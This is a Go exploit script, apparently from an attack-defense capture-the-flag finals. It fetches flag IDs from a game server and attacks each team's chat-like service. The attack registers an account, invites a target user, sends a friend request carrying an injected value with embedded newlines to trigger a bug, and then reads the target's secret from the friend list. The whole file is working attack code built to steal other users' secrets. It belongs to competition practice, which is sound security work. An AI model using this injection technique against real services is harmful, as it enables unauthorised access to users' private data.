package main

import (
	"apt/cmd/checker/utils"
	"apt/pkg/ws"
	"encoding/json"
	"fmt"
	"maps"
	"net/http"
	"os"
	"slices"
)

func getFlagIds(teamId string) []string {
	resp, err := http.Get("http://10.10.0.1:8081/flagIds")
	if err != nil {
		panic(err)
	}

	defer func() { _ = resp.Body.Close() }()

	type data struct {
		APTFinals map[string]map[string]string `json:"APT-Finals-2"`
	}

	var flagIds data
	if err := json.NewDecoder(resp.Body).Decode(&flagIds); err != nil {
		panic(err)
	}

	return slices.Collect(maps.Values(flagIds.APTFinals[teamId]))
}

func exploit(teamId, victim string) string {
	client, err := ws.NewClient(fmt.Sprintf("10.60.%s.1:8080", teamId), nil)
	if err != nil {
		panic(err)
	}

	username, secret := utils.RandStr(16), utils.RandStr(16)
	password, err := client.Register(username, secret)
	if err != nil {
		panic(err)
	}

	ok, err := client.Login(username, password)
	if err != nil {
		panic(err)
	} else if !ok {
		panic("login failed")
	}

	_, err = client.InviteFriend(victim)
	if err != nil {
		panic(err)
	}

	if err := client.AddFriend(victim, "YWFhYWFhYWFhYW\n\nFhYWFh"); err == nil {
		panic("no bug?")
	}

	client, err = ws.NewClient(fmt.Sprintf("10.60.%s.1:8080", teamId), nil)
	if err != nil {
		panic(err)
	}

	ok, err = client.Login(username, password)
	if err != nil {
		panic(err)
	} else if !ok {
		panic("login failed")
	}

	friends, err := client.ListFriends()
	if err != nil {
		panic(err)
	} else if len(friends) == 0 {
		panic("no friends")
	}

	return friends[0].Secret
}

func main() {
	flagIds := getFlagIds(os.Args[1])
	for _, flagId := range flagIds {
		flag := exploit(os.Args[1], flagId)
		println(flag)
	}
}
